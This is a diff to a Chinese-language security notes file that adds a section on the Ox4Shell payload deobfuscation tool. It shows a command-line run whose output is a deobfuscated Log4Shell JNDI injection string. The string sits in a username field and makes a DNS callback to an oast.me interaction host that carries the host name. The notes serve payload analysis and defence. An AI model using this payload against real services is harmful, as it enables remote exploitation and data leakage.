@@ -53,3 +53,13 @@ Content-Length: 36
 "index_patterns":["te*","bar"]
 }
 ```
+
+
+## payload 反混淆工具
+- https://github.com/ox-eye/Ox4Shell
+
+```
+
+(base) ➜  Ox4Shell git:(main) ✗ python ox4shell.py -f 1.txt
+username={{{{{{{::__${jndi:dns://127.0.0.1#@{hostName}.fbz3hpkvahmk6o0ak010hf7fgaewkf6te.oast.me/2022}{{{{{{&password=
+```
